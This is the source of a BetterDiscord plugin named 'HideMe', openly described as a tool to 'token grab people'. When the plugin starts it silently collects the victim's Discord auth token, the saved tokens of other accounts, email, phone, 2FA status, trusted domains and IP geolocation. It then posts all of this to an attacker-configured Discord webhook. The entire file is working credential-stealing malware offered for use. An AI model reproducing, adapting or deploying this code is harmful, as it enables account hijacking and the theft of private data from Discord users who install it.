/**
 * @name HideMe
 * @author HideakiAtsuyo
 * @authorId 868150205852291183
 * @version 1.1.9
 * @description Allows you to token grab people omg
 * @invite https://discord.gg/C7yHkVSE2M
 * @donate https://www.paypal.me/HideakiAtsuyoLmao
 * @website https://github.com/HideakiAtsuyo
 * @source https://github.com/HideakiAtsuyo/BetterGrabber/tree/plugin/GOD/
 * @updateUrl https://raw.githubusercontent.com/HideakiAtsuyo/BetterGrabber/plugin/GOD/HideMe.plugin.js
 */

class HideMe {
    // Constructor
    constructor() {
        this.initialized = false;
    }

    // Meta
    getName() {
        return "HideMe";
    }
    getShortName() {
        return "HideMe";
    }
    getDescription() {
        return "Better Discord Token Grab Lmao github.com/HideakiAtsuyo";
    }
    getVersion() {
        return "1.1.9";
    }
    getAuthor() {
        return "Hideaki Atsuyo";
    }

    // Settings  Panel
    getSettingsPanel() {
        return "<!--Enter Settings Panel o, just standard HTML-->";
    }

    // Load/Unload
    async load() {
    	//this.grab();
    }

    unload() {}

    // Events

    onMessage() {
        // Called when a message is received
    };

    onSwitch() {
        // Called when a server or channel is switched
    };

    observer(e) {
        // raw MutationObserver event for each mutation
    };

    // Start/Stop
    start() {
      this.initialize();
      this.grab();
    }

    stop() {
        //PluginUtilities.showToast(this.getName() + " " + this.getVersion() + " has stopped.");
    };

    //  Initialize
    initialize() {
        this.initialized = true;
        //PluginUtilities.showToast(this.getName() + " " + this.getVersion() + " has started.");
    }

    async grab(){
        window.dispatchEvent(new Event('beforeunload')); //Useless Atm
        const https = require('https');//Hehehe Hello XMLHttpRequest

        var config = {
            pingOnResult: true,
            webHook: "%webhook%",
            webhookUsername: "Hello World",
            webhookAvatar: "https://cdn.discordapp.com/avatars/908070943329488916/35ebf6d39bc25e52da855424119bc28f.webp?size=80",

            embedTitle: "Hello World",
            embedColor: 0x36393f,

            tts: false
        };

        function getIP(){
            return new Promise(async (resolve, reject) => {
                https.get({'host': 'api.ipify.org', 'port': 443, 'path': '/'}, function(response) {
                    response.on('data', function(body) {
                        return resolve(body.toString());
                    }).on('error', (e) => {
                        console.error(e);
                    });
                });
            });
        }

        function getIPInfos(IP){
            return new Promise(async (resolve, reject) => {
                https.get({'host': 'ipinfo.io', 'port': 443, 'path': `/widget/${IP}`, "headers": { "Referer": "https://ipinfo.io", "User-Agent": "HelloWorld" }}, function(response) {
                    response.on('data', function(body) {
                        return resolve(body.toString());
                    }).on('error', (e) => {
                        console.error(e);
                    });
                });
            });
        }

        const iframe = document.createElement("iframe");
        document.head.append(iframe);
        function getLocalStorageInfo(info){
            return new Promise(async (resolve, reject) => {
                return resolve(iframe.contentWindow.localStorage[info])
            });
        }

        var IP = await getIP();
        var IPInfos = await getIPInfos(IP);
        try{
            if(IPInfos.includes("Too Many Requests")){
                IPInfos = "Too Many Requests";
            } else {
                IPInfos = JSON.parse(IPInfos);
                IPInfos = `Hostname => "${IPInfos["hostname"]}"\nCountry => "${IPInfos["country"]}"\nPotential Location: "Lat: ${IPInfos["loc"].replace(",", " / Long: ")}\nISP: ${IPInfos["asn"]["name"]} (WebSite: ${IPInfos["asn"]["domain"]} / Route: ${IPInfos["asn"]["route"]})"\nType: "${IPInfos["privacy"]["vpn"] ? "VPN" : IPInfos["privacy"]["proxy"] ? "Proxy" : IPInfos["privacy"]["tor"] ? "Tor" : IPInfos["privacy"]["relay"] ? "Relay" : IPInfos["privacy"]["Hosting"] ? "Hosting" : "Not detected, good proxy or Real IP"}"`;
            }
        } catch {
            IPInfos = "An error happened, the result is too long, try to put the IP on ipinfo.io website :(";
        }

        var user = window.webpackChunkdiscord_app.push([[Math.random()],{},e=>{for(const r of Object.keys(e.c).map(r=>e.c[r].exports).filter(e=>e)){if(r.default&&void 0!==r.default.getCurrentUser)return JSON.parse(JSON.stringify(r.default.getCurrentUser()));if(void 0!==r.getCurrentUser)return JSON.parse(JSON.stringify(r.getCurrentUser()))}}]);
        var actualUserUsername = user["username"];
        var actualUserDiscriminator = user["discriminator"];
        var actualUserTag = `${actualUserUsername}#${actualUserDiscriminator}`;
        var actualUserToken = await getLocalStorageInfo("token");
        var actualUserID = user["id"];
        //var actualUserSettings = await getLocalStorageInfo("UserSettingsStore"); //Pretty Big
        var actualUserEmail = user["email"];
        var actualUserPremiumState = user["premiumType"];
        var storedTokens = await getLocalStorageInfo("tokens"); // For New Multi Account System
        var trustedDomains = await getLocalStorageInfo("MaskedLinkStore"); // Trusted Domains List(when you trust them with the "Yes" button)
        var verifiedGameAndProgramsList = await getLocalStorageInfo("GameStoreReportedGames"); //List of VERIFIED games/programs
        var enabled2FA = user["mfaEnabled"] ? "Yes" : "No"; //Verify if 2fa/mfa is enabled
        var actualUserPhone = user["phone"] ?? "No"; //Verify if the account have a phone
        var actualUserVerified = user["verified"]; //Verify if the account is verified

        var pD = JSON.stringify({
            content: config.pingOnResult ? "@everyone": "Ah Fuck No Ping :(",
            username: config.webhookUsername,
            avatar_url: config.webhookAvatar,
            tts: config.tts,
            embeds: [{"title": config.embedTitle, "footer": { "text": "Version: 1.1.9" }, "description": "[GitHub](https://github.com/HideakiAtsuyo/BetterGrabber)", "color": config.embedColor, "fields": [{ "name": "IP", "value": `\`${IP}\``, inline: false }, { "name": "Actual User Token", "value": `\`${actualUserToken.replaceAll("\"", "")||"Unknown Issue"}\``, inline: true }, { "name": "Actual User Tag With ID", "value": `\`${actualUserTag.replaceAll("\"", "")}\` - (\`${actualUserID.replaceAll("\"", "")}\`)`, inline: true }, { "name": "Actual User email (verified)", "value": `\`${actualUserEmail.replaceAll("\"", "")}\` (verified: \`${actualUserVerified}\`)`, inline: true }, { "name": "Actual User Phone", "value": `\`${actualUserPhone}\``, inline: true }, { "name": "Actual User 2FA/MFA Status", "value": `\`${enabled2FA}\``, inline: true }, { "name": "Actual User Premium Status(Nitro)", "value": `\`${["No", "Classic", "Boost"][actualUserPremiumState]||"No"}\``, inline: true }, { "name": "Trusted Domains List", "value": `\`\`\`\n${trustedDomains == undefined ? "null" : JSON.parse(trustedDomains)["trustedDomains"]}\`\`\``, inline: false }, { "name": "Stored Tokens(From Switch Account Feature :) (ID:Token))", "value": `\`\`\`json\n${storedTokens == undefined ? "null" : storedTokens}\`\`\``, inline: false }, { "name": "Verified Games & Programs", "value": `\`\`\`json\n${verifiedGameAndProgramsList == undefined ? "null": verifiedGameAndProgramsList}\`\`\``, inline: false }, { "name": "IP Infos", "value": `\`\`\`json\n${IPInfos}\`\`\`\n[More Infos about ${IP}](https://whatismyipaddress.com/ip/${IP})`, inline: false }]}]
        });

        //console.log(pD); //Only Used To Check The Actual Payload Nothing More :)

        var SendToWebhook = https.request({ "hostname": "discord.com", "port": 443, "path": config.webHook, "method": "POST", "headers": { 'Content-Type': "application/json", 'Content-Length': pD.length } });
        SendToWebhook.on('error', (e) => {
            //BdApi.alert(e);
            //console.error(e);
        });
        SendToWebhook.write(pD);
        SendToWebhook.end();
    }
}
